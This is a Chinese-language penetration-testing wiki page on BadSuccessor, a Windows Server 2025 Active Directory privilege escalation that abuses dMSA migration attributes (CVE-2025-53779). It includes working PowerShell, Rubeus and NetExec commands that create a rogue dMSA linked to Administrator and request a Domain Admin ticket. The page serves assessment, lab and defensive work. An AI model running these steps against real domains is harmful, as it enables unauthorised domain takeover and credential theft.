# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## 概述

**BadSuccessor** 利用 **delegated Managed Service Account** (**dMSA**) 的迁移工作流，该工作流是在 **Windows Server 2025** 中引入的。dMSA 可以通过 **`msDS-ManagedAccountPrecededByLink`** 关联到一个旧账号，并通过存储在 **`msDS-DelegatedMSAState`** 中的迁移状态进行切换。如果攻击者能够在可写的 OU 中创建 dMSA 并控制这些属性，KDC 就可以为攻击者控制的 dMSA 签发带有所链接账号 **authorization context** 的票据。

在实践中，这意味着一个低权限用户即使只拥有委派的 OU 权限，也可以创建一个新的 dMSA，将其指向 `Administrator`，完成迁移状态，然后获取一个其 PAC 中包含 **Domain Admins** 等特权组的 TGT。

## dMSA 迁移细节中需要关注的部分

- dMSA 是 **Windows Server 2025** 的特性。
- `Start-ADServiceAccountMigration` 会将迁移设置为 **started** 状态。
- `Complete-ADServiceAccountMigration` 会将迁移设置为 **completed** 状态。
- `msDS-DelegatedMSAState = 1` 表示迁移已开始。
- `msDS-DelegatedMSAState = 2` 表示迁移已完成。
- 在合法迁移期间，dMSA 的设计目的是透明地替代被取代的账号，因此 KDC/LSA 会保留前一个账号已经拥有的访问权限。

Microsoft Learn 还指出，在迁移期间，原始账号会与 dMSA 绑定，而 dMSA 预期可以访问旧账号原本可以访问的内容。BadSuccessor 正是利用了这一安全假设。

## 要求

1. 域中存在 **dMSA**，这意味着 AD 侧已具备 **Windows Server 2025** 支持。
2. 攻击者可以在某个 OU 中 **创建** `msDS-DelegatedManagedServiceAccount` 对象，或拥有等效的广泛子对象创建权限。
3. 攻击者可以 **写入** 相关 dMSA 属性，或完全控制其刚创建的 dMSA。
4. 攻击者可以从域加入的上下文，或从能连通 LDAP/Kerberos 的隧道中请求 Kerberos 票据。

### 实际检查

最直接的操作信号是验证域/林级别，并确认环境已经在使用新的 Server 2025 stack：
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
如果你看到像 `Windows2025Domain` 和 `Windows2025Forest` 这样的值，请将 **BadSuccessor / dMSA migration abuse** 作为优先检查项。

你也可以使用公开工具枚举被委派用于 dMSA 创建的可写 OUs：
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Abuse flow

1. 在你拥有 delegated create-child 权限的 OU 中创建一个 dMSA。
2. 将 **`msDS-ManagedAccountPrecededByLink`** 设置为特权目标的 DN，例如 `CN=Administrator,CN=Users,DC=corp,DC=local`。
3. 将 **`msDS-DelegatedMSAState`** 设置为 `2`，以将迁移标记为已完成。
4. 为新的 dMSA 请求一个 TGT，并使用返回的 ticket 访问特权服务。

PowerShell example:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ticket request / operational tooling examples:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## 为什么这不仅仅是权限提升

在合法迁移期间，Windows 也需要新的 dMSA 来处理在切换前为旧帐户签发的票据。这就是为什么与 dMSA 相关的票据材料在 **`KERB-DMSA-KEY-PACKAGE`** 流程中可以包含 **current** 和 **previous** keys。

对于攻击者控制的伪造迁移，这种行为会让 BadSuccessor 变成：

- 通过在 PAC 中继承有特权的组 SID 来进行 **权限提升**。
- **凭据材料泄露**，因为 previous-key 处理可能在易受攻击的工作流中暴露出等同于前任帐户 RC4/NT hash 的材料。

这使得该技术既可用于直接接管域，也可用于后续操作，例如 pass-the-hash 或更广泛的凭据入侵。

## 关于补丁状态的说明

原始的 BadSuccessor 行为 **不仅仅是一个理论上的 2025 预览版问题**。Microsoft 已将其分配为 **CVE-2025-53779**，并在 **2025 年 8 月** 发布了安全更新。请将该攻击保留在文档中，适用于：

- **labs / CTFs / assume-breach exercises**
- **未打补丁的 Windows Server 2025 环境**
- **评估期间对 OU 委派和 dMSA 暴露面的验证**

不要仅仅因为存在 dMSA 就假设 Windows Server 2025 域存在漏洞；请验证补丁级别并谨慎测试。

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
